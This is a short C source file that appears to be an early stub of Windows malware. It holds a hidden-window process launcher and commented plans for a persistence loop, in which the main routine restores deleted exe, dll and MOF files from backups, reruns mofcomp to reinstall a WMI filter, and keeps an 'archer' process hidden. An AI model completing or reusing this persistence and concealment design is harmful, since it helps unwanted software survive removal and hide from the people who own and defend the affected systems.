#include <windows.h>

void exec(char* program, char* command)
{
	STARTUPINFOA si;
	PROCESS_INFORMATION pi;

	ZeroMemory(&si, sizeof(si));
	si.cb = sizeof(si);
	ZeroMemory(&pi, sizeof(pi));
	
	CreateProcessA(program, command, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);

    // test both TODO
    WaitForInputIdle(pi.hProcess, INFINITE);
    WaitForSingleObject(pi.hProcess, INFINITE);

    // clean up and exit
	CloseHandle(pi.hProcess);
	CloseHandle(pi.hThread);
}

int main()
{
    // main program infinite loop. call for each of the 3 files.

    // check if exe + dll files exist - file check function, path parameter
    // check if mof file exists - file check function, path parameter
    // move backups to location if either one are moved / deleted, copy backup function, path1 path2 parameter
    // run mofcomp to install wmi filter every X seconds - once 3 file loop is done, sleep x seconds and run mofcomp.
    
    // guard: make sure archer process is hidden
}